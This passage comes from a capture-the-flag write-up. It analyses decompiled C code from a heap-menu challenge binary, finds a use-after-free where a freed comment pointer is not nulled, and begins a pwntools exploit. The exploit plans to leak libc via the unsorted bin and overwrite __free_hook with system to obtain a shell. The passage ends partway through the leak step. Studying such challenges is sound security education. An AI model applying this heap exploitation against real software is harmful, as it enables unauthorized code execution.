</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span><span class="s">&#34;Price: $%0.2f</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;No comment for the property.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Comment: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It just prints the property object metadata values</p>
<h4 id="change_username">change_username</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">change_name</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">size_t</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp-28h] [rbp-28h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp-20h] [rbp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">endbr64</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is the length of your new name?: &#34;</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%zu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="n">v2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">username</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter your new name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">fgets</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="n">username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Similar to edit, it will check:</p>
<ul>
<li>If the new size is smaller than the stored size, it will:
<ul>
<li>Directly replace the <code>username</code> values</li>
<li>Store the new size inside <code>username</code> object</li>
</ul>
</li>
<li>If the new size is larger, it will:
<ul>
<li>Free the chunk</li>
<li>Alloc new chunk with new size</li>
<li>Store the new size inside <code>username</code> object</li>
</ul>
</li>
</ul>
<h4 id="remove_property">remove_property</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">remove_property</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">property</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">free</span><span class="p">(</span><span class="n">property</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">property</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Wow, there is a bug on this method. What it do is basically:</p>
<ul>
<li>free(comment)
<ul>
<li>and <strong>NOT</strong> nulled it</li>
</ul>
</li>
<li>free(street)
<ul>
<li>and nulled it</li>
</ul>
</li>
<li>free(property)
<ul>
<li>and nulled it</li>
</ul>
</li>
</ul>
<p>After reading all of those decompilations, we can notice a bug where the comment is not nulled after being freed. This means, if we:</p>
<ul>
<li>add property with comment</li>
<li>remove property</li>
<li>add property without comment</li>
</ul>
<p>The latest property will still have comment (because <code>property</code> still located in the same address due to cache), and its comment still points to the freed chunk. What if we do <code>edit_property</code> on it? Basically we can forge the chunk metadata</p>
<h3 id="exploitation-plan">Exploitation Plan</h3>
<p>Okay, so important points that we can conclude from our initial analysis:</p>
<ul>
<li>We can malloc chunk with any size
<ul>
<li>Hence, we can freed a chunk to unsorted bin by malloc large chunk</li>
</ul>
</li>
<li>There is Use-After-Free (UAF) bug on the <code>comment</code>, where we can see the freed chunk, and edit it via <code>edit_property</code></li>
</ul>
<p>Seems like the rough plan is pretty clear. We can leak libc address by leveraging the UAF bug in the <code>comment</code> objectt. And then we need to be able to overwrite <code>__free_hook</code> by <code>system</code> to trigger a shell.</p>
<h3 id="solution">Solution</h3>
<p>Okay, so now I will explain my solution on this challenge. Let&rsquo;s define helper in our script first to help our life easier.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">lsn</span><span class="p">,</span> <span class="n">sn</span><span class="p">,</span> <span class="n">lc</span><span class="p">,</span> <span class="n">comment</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the house number: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># Isn&#39;t useful. Just set any value.</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of the street name: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lsn</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the street name: &#39;</span><span class="p">,</span> <span class="n">sn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the price of the property?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># Isn&#39;t useful. Just set any value.</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">lc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of the comment?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the comment: &#39;</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">lsn</span><span class="p">,</span> <span class="n">sn</span><span class="p">,</span> <span class="n">lc</span><span class="p">,</span> <span class="n">comment</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">change_comment</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">is_free_hook_overwritted</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the house number? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span> <span class="c1"># Isn&#39;t useful. No need to edit.</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">lsn</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the street? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the street? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new street name length: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lsn</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new street name: &#39;</span><span class="p">,</span> <span class="n">sn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the price of the property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span> <span class="c1"># Isn&#39;t useful. No need to edit.</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">lc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the comment? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">change_comment</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of the comment?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the comment: &#39;</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the comment? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new comment length: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_free_hook_overwritted</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># No need to enter new comment, as we have overwritten it with system</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new comment: &#39;</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show_property</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">comment</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># We only care the comment value</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">comment</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">change_username</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">ln</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of your new name?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ln</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your new name: &#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="part-1-leak-libc-address">Part 1: Leak Libc Address</h4>
<p>Okay, so now let&rsquo;s try to fire up our GDB to have a better visualization on the heap. Let&rsquo;s start the program by initializing our name</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># After first connection, by default the binary will call malloc(0x40)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and use this heap chunk for property variable</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your name: &#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the heap after we initialize our name</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x55802d04d290	0x0000000000000000	0x0000000000000081	................
</span></span><span class="line"><span class="cl">0x55802d04d2a0	0x00000000deadbeef	0x000000000000000a	................
</span></span><span class="line"><span class="cl">0x55802d04d2b0	0x0000000000000000	0x0000000000000000	................
</span></span><span class="line"><span class="cl">0x55802d04d2c0	0x0000000000000000	0x0000000000000000	................
</span></span><span class="line"><span class="cl">0x55802d04d2d0	0x0000000000000000	0x0000000000000000	................
</span></span><span class="line"><span class="cl">0x55802d04d2e0	0x0000000000000000	0x0000000000000000	................
</span></span><span class="line"><span class="cl">0x55802d04d2f0	0x0000000000000000	0x0000000000000000	................
</span></span><span class="line"><span class="cl">0x55802d04d300	0x0000000000000000	0x0000000000000000	................
</span></span><span class="line"><span class="cl">0x55802d04d310	0x0000000000000000	0x0000000000020cf1	................	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we need to free a chunk to unsorted bin. Simply malloc a large chunk and free it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x427</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>What we want to achieve on here is:</p>
<ul>
<li>Create a large chunk in <code>comment</code></li>
<li>Alloc a new chunk below it to prevent consolidation</li>
<li>Freed all the object</li>
</ul>
<p>After freed all the object, we will have:</p>
<ul>
<li>1 chunk inside unsorted_bin (<code>comment</code>)</li>
